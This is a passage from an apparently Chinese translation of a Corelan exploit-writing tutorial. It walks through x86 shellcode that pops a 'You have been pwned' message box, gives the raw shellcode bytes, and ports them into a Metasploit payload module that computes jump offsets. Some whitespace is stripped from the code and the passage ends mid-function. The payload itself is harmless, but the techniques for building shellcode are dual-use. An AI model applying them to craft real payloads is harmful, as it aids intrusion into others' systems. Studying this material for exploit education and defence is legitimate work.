pushedx ;put0onstack
pushebx ;putpointertoTitleonstack
pushecx ;putpointertoTextonstack
pushedx ;put0onstack
calleax ;callMessageBoxA(0,Text,Title,0)
;ExitFunc
xoreax,eax
;zeroouteax
pusheax ;put0onstack
call[ebp+8] ;ExitProcess(0)
;=======Function:GetpointertoMessageBoxTitle============
GetTitle: ;DefinelabelforlocationofMessageBoxtitlestring
callTitleReturn ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"Corelan" ;Writetherawbytesintotheshellcode
db0x00 ;Terminateourstringwithanullcharacter.
;=======Function:GetpointertoMessageBoxText============
GetText: ;Definelabelforlocationofmsgboxargumentstring
callTextReturn ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"YouhavebeenpwnedbyCorelan";Writetherawbytesintotheshellcode
db0x00 ;Terminateourstringwithanullcharacter.
注意，我并没有真正花时间来使它没有null字节，因为Metasploit上有很多编码器将会为我
们做这个。
虽然这个代码看起来很不错，但是还有一个问题。在我们能使它在Metasploit上工作之前，
（允许人们提供自己的自定义标题和文本）我们需要做一个重要的改变。
想一想...如果标题文本可能跟“Corelan”的大小不一样，然后到GetText的偏移量将会不一
样，这个exploit将不会产生想要的结果。毕竟，跳转到GetText标签的偏移量是在你从nasm
编译这个代码时产生的。因此如果用户提供一个不同大小的字符串，于是偏移量将不会改变，
并且我们在试着得到MessageBox文本的指针时也会遇到这个问题。
为了修改这个，我们将不得不动态计算到GetText标签的偏移量，在Metasploit脚本中，基
于标题字符串的长度。
让我们从转化已有的asm到字节码开始。
C:\shellcode>perlpveReadbin.plcorelanmsgbox.bin
Readingcorelanmsgbox.bin
Read310bytes
"\x56\x31\xc0\x31\xdb\xb3\x30\x64"
"\x8b\x03\x8b\x40\x0c\x8b\x40\x14"
"\x50\x5e\x8b\x06\x50\x5e\x8b\x06"
"\x8b\x40\x10\x5e\xe9\x92\x00\x00"
"\x00\x60\x8b\x6c\x24\x24\x8b\x45"
"\x3c\x8b\x54\x05\x78\x01\xea\x8b"
"\x4a\x18\x8b\x5a\x20\x01\xeb\xe3"
"\x37\x49\x8b\x34\x8b\x01\xee\x31"
"\xff\x31\xc0\xfc\xac\x84\xc0\x74"
"\x0a\xc1\xcf\x0d\x01\xc7\xe9\xf1"
"\xff\xff\xff\x3b\x7c\x24\x28\x75"
"\xde\x8b\x5a\x24\x01\xeb\x66\x8b"
"\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b"
"\x04\x8b\x01\xe8\x89\x44\x24\x1c"
"\x61\xc3\xad\x50\x52\xe8\xa7\xff"
"\xff\xff\x89\x07\x81\xc4\x08\x00"
"\x00\x00\x81\xc7\x04\x00\x00\x00"
"\x39\xce\x75\xe6\xc3\xe8\x46\x00"
"\x00\x00\x75\x73\x65\x72\x33\x32"
"\x2e\x64\x6c\x6c\x00\xe8\x20\x00"
"\x00\x00\x8e\x4e\x0e\xec\x7e\xd8"
"\xe2\x73\xe8\x33\x00\x00\x00\xa8"
"\xa2\x4d\xbc\x81\xec\x08\x00\x00"
"\x00\x89\xe5\x89\xc2\xe9\xdb\xff"
"\xff\xff\x5e\x8d\x7d\x04\x89\xf1"
"\x81\xc1\x08\x00\x00\x00\xe8\x9f"
"\xff\xff\xff\xe9\xb5\xff\xff\xff"
"\xff\x55\x04\x89\xc2\xe9\xc8\xff"
"\xff\xff\x5e\xad\x50\x52\xe8\x36"
"\xff\xff\xff\xe9\x15\x00\x00\x00"
"\x5b\xe9\x1c\x00\x00\x00\x59\x31"
"\xd2\x52\x53\x51\x52\xff\xd0\x31"
"\xc0\x50\xff\x55\x08\xe8\xe6\xff"
"\xff\xff\x43\x6f\x72\x65\x6c\x61"
"\x6e\x00\xe8\xdf\xff\xff\xff\x59"
"\x6f\x75\x20\x68\x61\x76\x65\x20"
"\x62\x65\x65\x6e\x20\x70\x77\x6e"
"\x65\x64\x20\x62\x79\x20\x43\x6f"
"\x72\x65\x6c\x61\x6e\x00";
在代码的末尾，我们看到2个字符串。再上面的几行，我们看到2个调用：
\xe9\x15\x00\x00\x00=跳转到GetTitle（跳转0x1A字节）。这个工作地很好并且一直工作很
好。我们不需要改变它，因为它一直会是一样的偏移量（所有的字符串都在GetTitle标签下
面）。往回跳转(调用TitleReturn)也不错。
\xe9\x1c\x00\x00\x00=跳转到GetText（跳转0x21字节）。这个偏移量取决于标题字符串的大
小。不只是到GetText的偏移量是变化的，跳回到TextReturn的偏移量也是变化的。（注意：
为了减小复杂度，我们会弄些检查来确认标题不超过254个字符...你将会在一会儿明白为什
么）
在调试器中，相关的代码是这样的：
我们允许用户插入他们自己的字符串来把playload分成3块：
第一块（在第一个字符串（标题）前面的字节码）
第一个字符串后的代码（就是null终结符+第二个字符串之前的字节码）
第二个字符串后的null字符串（文本）
接下来，我们需要注意GetText和TextReturn跳转。唯一需要改变的是这些指令的偏移量，
因为偏移量取决于标题字符串的大小。偏移量可以这样计算出来：
GetText跳转需要的偏移量=15字节（所有的在GetText和GetTitle标签之间的指令）
+5个字节（调用TitleReturn）+标题的长度+1（字符串后的null字节）
调用TextR需要的偏移量（后跳转）=15字节（和上面一样的原因）+5字节（和
上面一样的原因）+标题的长度+1（null字节）-1（pop指令）+5（调用指令自身）。为了使
它简单，我们将限制标题的大小为255，因此你能简单地从255减去这个值，并且偏移量将
会是最大。1字节长（+“\xff\xff\xff").
因此，最后的payload结构是这样的：
在第一个GetText跳转之前的所有指令（包括）（包括“\xff”）
计算到GetText跳转的偏移量的字节码
完成前跳转（\x00\x00\x00）+pop指令（当GetText返回时往回调用）的字节码
其余的指令包括第一个字符串前的往回跳转
第一个字符串
null字节
往回跳转的第一个字节（调用TextReturn）（“\xe9”）
计算往后跳转的偏移量的字节码
完成后跳转的其余指令（“\xff\xff\xff”）
第二个字符串
null字节
（基本上，在调试器中看下代码，将代码分成固定的和可变的成分，简单算下字节数然
后做些基本的数学...）
然后，你需要做的唯一的事是计算偏移量和在执行时将各块重新结合。
所以，将shellcode转化进Metasploit中就像在framework3/modules/payloads/singles/windows
下创建一个.rb脚本这么简单。
（messagebox.rb--看email顶部的zip文件）
##
#$Id:messagebox.rb12010-02-2600:28:00:00Zcorelanc0d3r&rick2600$
##
require'msf/core'
moduleMetasploit3
includeMsf::Payload::Windows
includeMsf::Payload::Single
definitialize(info={})
super(update_info(info,
'Name' =>'WindowsMessageboxwithcustomtitleandtext',
'Version' =>'$Revision:1$',
'Description' =>'SpawnsMessageBoxwithacustomizabletitle&text',
'Author' =>['corelanc0d3r-peter.ve[at]corelan.be',
'rick2600-ricks2600[at]gmail.com'],
'License' =>BSD_LICENSE,
'Platform' =>'win',
'Arch' =>ARCH_X86,
'Privileged' =>false,
'Payload' =>
{
'Offsets'=>{},
'Payload'=> "\x56\x31\xc0\x31\xdb\xb3\x30\x64"+
"\x8b\x03\x8b\x40\x0c\x8b\x40\x14"+
"\x50\x5e\x8b\x06\x50\x5e\x8b\x06"+
"\x8b\x40\x10\x5e\xe9\x92\x00\x00"+
"\x00\x60\x8b\x6c\x24\x24\x8b\x45"+
"\x3c\x8b\x54\x05\x78\x01\xea\x8b"+
"\x4a\x18\x8b\x5a\x20\x01\xeb\xe3"+
"\x37\x49\x8b\x34\x8b\x01\xee\x31"+
"\xff\x31\xc0\xfc\xac\x84\xc0\x74"+
"\x0a\xc1\xcf\x0d\x01\xc7\xe9\xf1"+
"\xff\xff\xff\x3b\x7c\x24\x28\x75"+
"\xde\x8b\x5a\x24\x01\xeb\x66\x8b"+
"\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b"+
"\x04\x8b\x01\xe8\x89\x44\x24\x1c"+
"\x61\xc3\xad\x50\x52\xe8\xa7\xff"+
"\xff\xff\x89\x07\x81\xc4\x08\x00"+
"\x00\x00\x81\xc7\x04\x00\x00\x00"+
"\x39\xce\x75\xe6\xc3\xe8\x46\x00"+
"\x00\x00\x75\x73\x65\x72\x33\x32"+
"\x2e\x64\x6c\x6c\x00\xe8\x20\x00"+
"\x00\x00\x8e\x4e\x0e\xec\x7e\xd8"+
"\xe2\x73\xe8\x33\x00\x00\x00\xa8"+
"\xa2\x4d\xbc\x81\xec\x08\x00\x00"+
"\x00\x89\xe5\x89\xc2\xe9\xdb\xff"+
"\xff\xff\x5e\x8d\x7d\x04\x89\xf1"+
"\x81\xc1\x08\x00\x00\x00\xe8\x9f"+
"\xff\xff\xff\xe9\xb5\xff\xff\xff"+
"\xff\x55\x04\x89\xc2\xe9\xc8\xff"+
"\xff\xff\x5e\xad\x50\x52\xe8\x36"+
"\xff\xff\xff\xe9\x15\x00\x00\x00"+
"\x5b\xe9"
}
))
#EXITFUNC:hardcodedtoExitProcess:/
deregister_options('EXITFUNC')
#Registercommandexecutionoptions
register_options(
[
OptString.new('TITLE',[true,
"MessageboxTitle(max255chars)"]),
OptString.new('TEXT',[true,
"MessageboxText"])
],self.class)
end
#
#Constructsthepayload
#
defgenerate
strTitle=datastore['TITLE']
if(strTitle)
iTitle=strTitle.length
if(iTitle<255)
offset2Title=(15+5+iTitle+1).chr
offsetBack=(255-(15+5+iTitle+5)).chr
payload_data=module_info['Payload']['Payload']
payload_data+=offset2Title
payload_data+="\x00\x00\x00\x59\x31\xd2\x52\x53\x51\x52\xff\xd0\x31"
payload_data+="\xc0\x50\xff\x55\x08\xe8\xe6\xff\xff\xff"
payload_data+=strTitle
payload_data+="\x00\xe8"